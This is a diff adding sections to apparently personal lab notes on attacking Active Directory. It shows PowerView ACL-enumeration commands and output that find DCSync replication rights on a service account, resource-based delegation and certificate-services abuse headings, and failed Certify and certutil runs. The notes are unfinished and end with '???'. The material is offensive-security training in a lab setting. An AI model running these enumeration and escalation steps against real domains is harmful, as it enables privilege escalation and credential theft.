@@ -442,6 +442,62 @@ Closing writers
 ```
 ❌
 
+`Find-InterestingDomainACL -ResolveGUIDs | ?{$_.identityreferencename -match 'studentuser'}`
+❌
+
+`Find-InterestingDomainACL -ResolveGUIDs | ?{$_.identityreferencename -match 'techservice'}`
+❌
+
+`Find-InterestingDomainACL -ResolveGUIDs | ?{$_.identityreferencename -match 'databaseagent'}`
+❌
+
+`Find-InterestingDomainACL -ResolveGUIDs | ?{$_.identityreferencename -match 'sqlserversync'}`:
+```
+ObjectDN                : DC=tech,DC=finance,DC=corp
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : ExtendedRight
+ObjectAceType           : DS-Replication-Get-Changes-In-Filtered-Set📑
+AceFlags                : None
+AceType                 : AccessAllowedObject
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-1325336202-3661212667-302732393-1111
+IdentityReferenceName   : sqlserversync👤
+IdentityReferenceDomain : tech.finance.corp
+IdentityReferenceDN     : CN=sqlserver sync,CN=Users,DC=tech,DC=finance,DC=corp
+IdentityReferenceClass  : user
+
+ObjectDN                : DC=tech,DC=finance,DC=corp
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : ExtendedRight
+ObjectAceType           : DS-Replication-Get-Changes📑
+AceFlags                : None
+AceType                 : AccessAllowedObject
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-1325336202-3661212667-302732393-1111
+IdentityReferenceName   : sqlserversync👤
+IdentityReferenceDomain : tech.finance.corp
+IdentityReferenceDN     : CN=sqlserver sync,CN=Users,DC=tech,DC=finance,DC=corp
+IdentityReferenceClass  : user
+
+ObjectDN                : DC=tech,DC=finance,DC=corp
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : ExtendedRight
+ObjectAceType           : DS-Replication-Get-Changes-All📑
+AceFlags                : None
+AceType                 : AccessAllowedObject
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-1325336202-3661212667-302732393-1111
+IdentityReferenceName   : sqlserversync👤
+IdentityReferenceDomain : tech.finance.corp
+IdentityReferenceDN     : CN=sqlserver sync,CN=Users,DC=tech,DC=finance,DC=corp
+IdentityReferenceClass  : user
+```
+
+`Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'RDPUsers'}`:
+```
+```
+❌
+
 `Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'Domain Admins'}`:
 ```
 ```
@@ -468,11 +524,6 @@ AccessControlType : Allow
 
 [SNIP]
 ```
-
-`Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'RDPUsers'}`:
-```
-```
-❌
 
 **Domain Enumeration | OUs**
 
@@ -1707,6 +1758,38 @@ C:\Users\Administrator.TECH>
 ```
 🚀
 
+#### Domain Privilege Escalation | Resource-based Constrained Delegation (with PowerView, Rubeus, SafetyKatz)
+
+- **Find a Target Server where we have Write Permissions and Access to it**
+
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+
+`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
+```
+[SNIP]
+```
+
+`Import-Module C:\AD\Tools\PowerView.ps1`
+
+`Find-InterestingDomainACL | ?{$_.identityreferencename -match 'techservice'}`
+
+`Find-InterestingDomainACL | ?{$_.identityreferencename -match 'sqlserversync'}`:
+```
+ObjectDN📌              : CN=DCORP-MGMT🖥️,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : ListChildren, ReadProperty, GenericWrite📌
+ObjectAceType           : None
+AceFlags                : None
+AceType                 : AccessAllowed
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-719815819-3726368948-3917688648-1121
+IdentityReferenceName   : ciadmin👤
+IdentityReferenceDomain : dollarcorp.moneycorp.local
+IdentityReferenceDN     : CN=ci admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
+IdentityReferenceClass  : user
+```
+
+
 #### Cross Trust Attacks | SQL Server Links Abuse (with PowerUpSQL, Invoke-PowerShellTcpEx)
 
 - **Find a Target SQL Server where we have Connection Privileges**
@@ -1726,7 +1809,135 @@ VERBOSE: dbserver31.tech.finance.corp : Connection Failed.
 ```
 ❌
 
+---
 
+### AD Certificate Services Abuse
+
+#### AD Certificate Services Abuse | ESC1 + ESC3 (with Certify, Rubeus)
+
+- **Find ESC1 Vulnerable Certificate Templates**
+
+![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
+
+`C:\AD\Tools\Certify.exe cas`:
+```
+[SNIP]
+
+[*] Action: Find certificate authorities
+[*] Using the search base 'CN=Configuration,DC=finance,DC=corp'
+
+
+[*] Root CAs
+
+
+
+[*] NTAuthCertificates - Certificates that enable authentication:
+
+
+[!] Unhandled Certify exception:
+
+System.DirectoryServices.DirectoryServicesCOMException (0x80072030): There is no such object on the server.
+
+[SNIP]
+```
+❌
+
+`certutil -config - -ping`:
+```
+No active Certification Authorities found: No more data is available. 0x80070103 (WIN32/HTTP: 259 ERROR_NO_MORE_ITEMS)
+CertUtil: -ping command FAILED: 0x80070103 (WIN32/HTTP: 259 ERROR_NO_MORE_ITEMS)
+CertUtil: No more data is available.
+```
+❌
+
+`certutil -dump`:
+```
+CertUtil: -dump command completed successfully.
+```
+❌
 
 ---
 
+#### Domain Persistence | Replication Rights Abuse + DCSync (with PowerView, Rubeus, SafetyKatz)
+
+![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
+
+`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
+```
+[SNIP]
+```
+
+`Import-Module C:\AD\Tools\PowerView.ps1`
+
+`Get-DomainObjectAcl -SearchBase "DC=tech,DC=finance,DC=corp" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match 'studentuser'}`:
+```
+```
+❌
+
+`Get-DomainObjectAcl -SearchBase "DC=tech,DC=finance,DC=corp" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match 'sqlserversync'}`:
+```
+AceQualifier           : AccessAllowed
+ObjectDN               : DC=tech,DC=finance,DC=corp
+ActiveDirectoryRights  : ExtendedRight
+ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set📑
+ObjectSID              : S-1-5-21-1325336202-3661212667-302732393
+InheritanceFlags       : None
+BinaryLength           : 56
+AceType                : AccessAllowedObject
+ObjectAceFlags         : ObjectAceTypePresent
+IsCallback             : False
+PropagationFlags       : None
+SecurityIdentifier     : S-1-5-21-1325336202-3661212667-302732393-1111
+AccessMask             : 256
+AuditFlags             : None
+IsInherited            : False
+AceFlags               : None
+InheritedObjectAceType : All
+OpaqueLength           : 0
+IdentityName           : TECH\sqlserversync👤
+
+AceQualifier           : AccessAllowed
+ObjectDN               : DC=tech,DC=finance,DC=corp
+ActiveDirectoryRights  : ExtendedRight
+ObjectAceType          : DS-Replication-Get-Changes📑
+ObjectSID              : S-1-5-21-1325336202-3661212667-302732393
+InheritanceFlags       : None
+BinaryLength           : 56
+AceType                : AccessAllowedObject
+ObjectAceFlags         : ObjectAceTypePresent
+IsCallback             : False
+PropagationFlags       : None
+SecurityIdentifier     : S-1-5-21-1325336202-3661212667-302732393-1111
+AccessMask             : 256
+AuditFlags             : None
+IsInherited            : False
+AceFlags               : None
+InheritedObjectAceType : All
+OpaqueLength           : 0
+IdentityName           : TECH\sqlserversync👤
+
+AceQualifier           : AccessAllowed
+ObjectDN               : DC=tech,DC=finance,DC=corp
+ActiveDirectoryRights  : ExtendedRight
+ObjectAceType          : DS-Replication-Get-Changes-All📑
+ObjectSID              : S-1-5-21-1325336202-3661212667-302732393
+InheritanceFlags       : None
+BinaryLength           : 56
+AceType                : AccessAllowedObject
+ObjectAceFlags         : ObjectAceTypePresent
+IsCallback             : False
+PropagationFlags       : None
+SecurityIdentifier     : S-1-5-21-1325336202-3661212667-302732393-1111
+AccessMask             : 256
+AuditFlags             : None
+IsInherited            : False
+AceFlags               : None
+InheritedObjectAceType : All
+OpaqueLength           : 0
+IdentityName           : TECH\sqlserversync👤
+```
+
+???
+
+---
+---
